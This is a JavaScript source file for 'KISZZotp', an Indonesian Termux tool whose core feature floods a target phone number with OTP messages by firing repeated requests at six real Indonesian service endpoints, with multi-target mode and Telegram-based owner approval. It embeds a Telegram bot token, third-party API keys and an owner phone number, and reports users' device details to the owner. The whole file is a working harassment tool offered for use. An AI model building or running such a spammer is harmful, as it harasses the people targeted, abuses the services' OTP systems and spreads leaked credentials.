import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const C = {
    TOKEN: '8732611588:AAFzG1j0gRgyEYURywdzOVIuKc9oz0JmJCg',
    CHAT_ID: '8276813899',
    OWNER: '085168142675',
    VER: '2.0.0',
    TIMEOUT: 120,
    POLL: 1,
};

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function getID() {
    try { return `${execSync('id -u').toString().trim()}@${os.hostname()}`; } catch { return 'unknown'; }
}
function getDevice() {
    try {
        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${m} (Android ${a})`;
    } catch { return 'Unknown'; }
}
function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
function genCode() { return crypto.randomInt(100000, 999999).toString(); }

async function sendTG(text, kb = null) {
    try {
        const p = { chat_id: C.CHAT_ID, text, parse_mode: 'Markdown' };
        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
        await axios.post(`https://api.telegram.org/bot${C.TOKEN}/sendMessage`, p);
        return true;
    } catch { return false; }
}
async function ansCB(id, text) {
    try { await axios.post(`https://api.telegram.org/bot${C.TOKEN}/answerCallbackQuery`, { callback_query_id: id, text, show_alert: false }); } catch {}
}
async function getUpd(off) {
    try { const r = await axios.get(`https://api.telegram.org/bot${C.TOKEN}/getUpdates`, { params: { offset: off, timeout: 10 } }); return r.data.result || []; } catch { return []; }
}

function isApp(id) {
    try { if (!fs.existsSync('approved.json')) return false; return JSON.parse(fs.readFileSync('approved.json')).includes(id); } catch { return false; }
}
function saveApp(id) {
    try { let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); } return true; } catch { return false; }
}
function remApp(id) {
    try { let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; const nd = d.filter(x => x !== id); fs.writeFileSync('approved.json', JSON.stringify(nd, null, 2)); return true; } catch { return false; }
}

function getLimit(id) {
    try { if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() }; const d = JSON.parse(fs.readFileSync('limits.json')); return d[id] || { count: 0, date: new Date().toDateString() }; } catch { return { count: 0, date: new Date().toDateString() }; }
}
function incLimit(id) {
    try { let d = fs.existsSync('limits.json') ? JSON.parse(fs.readFileSync('limits.json')) : {}; const today = new Date().toDateString(); if (!d[id] || d[id].date !== today) { d[id] = { count: 1, date: today }; } else { d[id].count += 1; } fs.writeFileSync('limits.json', JSON.stringify(d, null, 2)); return d[id].count; } catch { return 0; }
}

async function reqApp(user, id, dev) {
    const code = genCode();
    const kb = [[{ text: '✅ Approve', callback_data: `app_${code}` }, { text: '❌ Deny', callback_data: `den_${code}` }]];
    const msg = `🔐 *Request Approval*\n👤 ${user}\n🆔 ${id}\n📱 ${dev}\n🔑 *${code}*`;
    console.log(chalk.yellow('\n⏳ Mengirim request...'));
    if (!await sendTG(msg, kb)) { console.log(chalk.red('❌ Gagal kirim ke TG.')); process.exit(1); }
    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
    let off = 0;
    try { const old = await getUpd(0); if (old.length > 0) off = old[old.length - 1].update_id + 1; } catch {}
    const start = Date.now();
    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
        try {
            const up = await getUpd(off);
            for (const u of up) {
                off = u.update_id + 1;
                if (u.callback_query) {
                    const d = u.callback_query.data;
                    const from = u.callback_query.from.id;
                    const cid = u.callback_query.id;
                    if (from == C.CHAT_ID) {
                        if (d === `app_${code}`) { await ansCB(cid, '✅ Disetujui!'); console.log(chalk.green('\n✅ APPROVED!')); saveApp(id); return true; }
                        if (d === `den_${code}`) { await ansCB(cid, '❌ Ditolak.'); console.log(chalk.red('\n❌ DENIED!')); return false; }
                    } else { await ansCB(cid, '❌ Bukan owner!'); }
                }
            }
        } catch {}
        await sleep(C.POLL * 1000);
    }
    console.log(chalk.red('\n⏰ Waktu habis!'));
    return false;
}

function getUser() {
    let n = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    return n.trim() || 'Anonymous';
}
function getStat(isO) { return isO ? chalk.green('★ OWNER') : chalk.yellow('▸ Gratisan'); }

function showHead(u, s, id, dev) {
    console.clear();
    console.log(chalk.cyan(`\n╔═══════════════════════════════════╗\n║   KISZZotp v${C.VER}               ║\n╠═══════════════════════════════════╣\n║ 👤 User  : ${chalk.green(u)}\n║ 📊 Status: ${s}\n║ 🆔 ID    : ${chalk.blue(id)}\n║ 📱 Device: ${chalk.magenta(dev)}\n║ ⏰ Waktu : ${chalk.gray(getTime())}\n╚═══════════════════════════════════╝\n`));
}

function showMenu(isO) {
    console.log(chalk.yellow(`\n📋 MENU UTAMA`));
    console.log(chalk.yellow(`─`.repeat(30)));
    console.log(chalk.cyan(`1.`) + ` 🚀 Spammer OTP`);
    console.log(chalk.cyan(`2.`) + ` 🐛 Lapor Bug`);
    console.log(chalk.cyan(`3.`) + ` 🔄 Cek Update`);
    console.log(chalk.cyan(`4.`) + ` ❌ Keluar`);
    if (isO) console.log(chalk.cyan(`5.`) + ` 👥 Add Partner (Owner Only)`);
    console.log(chalk.yellow(`─`.repeat(30)));
                           }
async function spam(user, id, isO, isP) {
    console.clear();
    console.log(chalk.cyan(`\n🚀 SPAMMER OTP\n`));
    if (!isO && !isP) {
        const lim = getLimit(id);
        const today = new Date().toDateString();
        if (lim.date === today && lim.count >= 3) {
            console.log(chalk.red('❌ Limit habis! (3x/hari). Upgrade ke partner.'));
            readlineSync.question(chalk.gray('\nTekan Enter...'));
            return;
        }
    }
    const inp = readlineSync.question(chalk.white('📱 Nomor (pisah koma untuk partner/owner): '));
    if (!inp.trim()) return console.log(chalk.red('❌ Tidak boleh kosong!'));
    let targets = (isP || isO) ? inp.split(',').map(t => t.trim()) : [inp.trim()];
    const delay = (isP || isO) ? 500 : 2000;
    for (const t of targets) {
        let phone = t.replace(/[^0-9]/g, "");
        if (phone.startsWith("0")) phone = "62" + phone.slice(1);
        if (!phone.startsWith("62")) phone = "62" + phone;
        const p08 = "0" + phone.slice(2);
        const p62 = phone;
        console.log(chalk.green(`✅ Target: ${phone}`));
        const otp = [
            { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
            { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
            { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
            { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
            { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
            { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
        ];
        let s = 0, f = 0;
        for (let i = 0; i < otp.length; i++) {
            const ep = otp[i];
            try {
                const cfg = { headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) }, timeout: 10000 };
                process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
                if (ep.method === "GET") await axios.get(ep.url, cfg);
                else await axios.post(ep.url, ep.data, cfg);
                s++; console.log(chalk.green('✅ Berhasil'));
            } catch { f++; console.log(chalk.red('❌ Gagal')); }
            await sleep(delay);
        }
        console.log(`\n📱 ${phone}\n📤 ${otp.length}\n✅ ${s}\n❌ ${f}`);
    }
    if (!isO && !isP) {
        const nc = incLimit(id);
        console.log(chalk.gray(`📊 Sisa limit: ${3 - nc} dari 3.`));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function laporBug() {
    console.clear();
    console.log(chalk.yellow(`\n🐛 LAPOR BUG\n`));
    console.log(chalk.white(`📱 Owner: ${C.OWNER}`));
    const c = readlineSync.question(chalk.cyan('Buka WhatsApp? (y/n): '));
    if (c.toLowerCase() === 'y') {
        execSync(`termux-open-url "https://wa.me/${C.OWNER}?text=Halo%20KISZZ%2C%20saya%20ingin%20lapor%20bug."`);
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function cekUpdate() {
    console.clear();
    console.log(chalk.cyan(`\n🔄 CEK UPDATE\n`));
    console.log(chalk.green(`✅ Versi: ${C.VER}`));
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function addPartner() {
    console.clear();
    console.log(chalk.green(`\n👥 ADD PARTNER\n`));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) return console.log(chalk.red('❌ Tidak boleh kosong!'));
    if (isApp(tid.trim())) { console.log(chalk.yellow(`⚠️ ${tid} sudah ada.`)); } else { saveApp(tid.trim()); console.log(chalk.green(`✅ ${tid} ditambahkan!`)); }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

// ====== MAIN ======
async function main() {
    console.clear();
    console.log(chalk.cyan(`\n╔═══════════════════════════════════════════════╗\n║     SELAMAT DATANG DI KISZZotp               ║\n╚═══════════════════════════════════════════════╝\n`));
    await sleep(1000);
    const userName = getUser();
    const termuxId = getID();
    const device = getDevice();
    const isOwner = userName.toLowerCase() === 'kiszzaja';
    const isPartner = isApp(termuxId);

    if (!isOwner) {
        if (!isApp(termuxId)) {
            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
            if (!await reqApp(userName, termuxId, device)) {
                console.log(chalk.red('❌ Akses ditolak.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Sudah terdaftar!'));
            await sleep(1000);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode!'));
        await sleep(1000);
    }

    // ====== POLLING TELEGRAM COMMAND (OWNER) ======
    let offset = 0;
    (async function pollTelegram() {
        while (true) {
            if (isOwner) {
                try {
                    const updates = await getUpd(offset);
                    for (const u of updates) {
                        offset = u.update_id + 1;
                        if (u.message && u.message.text) {
                            const text = u.message.text;
                            const fromId = u.message.from.id;
                            if (fromId == C.CHAT_ID) {
                                if (text.startsWith('/setstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 3) {
                                        await sendTG('❌ Format: /setstatus <termuxId> <status>\nContoh: /setstatus 10192@localhost Gembel');
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    const status = parts.slice(2).join(' ');
                                    try {
                                        let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        sd[targetId] = status;
                                        fs.writeFileSync('status.json', JSON.stringify(sd, null, 2));
                                        await sendTG(`✅ Status *${targetId}* berhasil diubah menjadi *${status}*`);
                                    } catch (e) {
                                        await sendTG(`❌ Gagal mengubah status: ${e.message}`);
                                    }
                                }
                                else if (text.startsWith('/getstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 2) {
                                        await sendTG('❌ Format: /getstatus <termuxId>\nContoh: /getstatus 10192@localhost');
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    try {
                                        const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        const status = sd[targetId] || 'Gratisan (belum diatur)';
                                        await sendTG(`📌 Status *${targetId}*: *${status}*`);
                                    } catch (e) {
                                        await sendTG(`❌ Gagal mengambil status: ${e.message}`);
                                    }
                                }
                                else if (text.startsWith('/help')) {
                                    await sendTG(`📋 *Command tersedia untuk owner:*\n\n` +
                                                 `/setstatus <termuxId> <status> - Ubah status user\n` +
                                                 `/getstatus <termuxId> - Lihat status user\n` +
                                                 `/help - Tampilkan bantuan ini`);
                                }
                                else {
                                    await sendTG(`❌ Command tidak dikenali.\nKetik /help untuk daftar command.`);
                                }
                            }
                        }
                    }
                } catch {}
            }
            await sleep(2000);
        }
    })();

    // ====== MENU UTAMA ======
    while (true) {
        const status = getStat(isOwner);
        showHead(userName, status, termuxId, device);
        showMenu(isOwner);

        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-5]: '));

        switch (choice) {
            case '1': await spam(userName, termuxId, isOwner, isPartner); break;
            case '2': laporBug(); break;
            case '3': cekUpdate(); break;
            case '4': console.log(chalk.green('\n👋 Sampai jumpa!')); process.exit(0);
            case '5':
                if (isOwner) await addPartner();
                else console.log(chalk.red('❌ Menu khusus owner!'));
                break;
            default: console.log(chalk.red('❌ Pilihan salah!')); await sleep(1000);
        }
    }
}

main().catch(err => console.error(chalk.red('❌ Error:', err.message)));
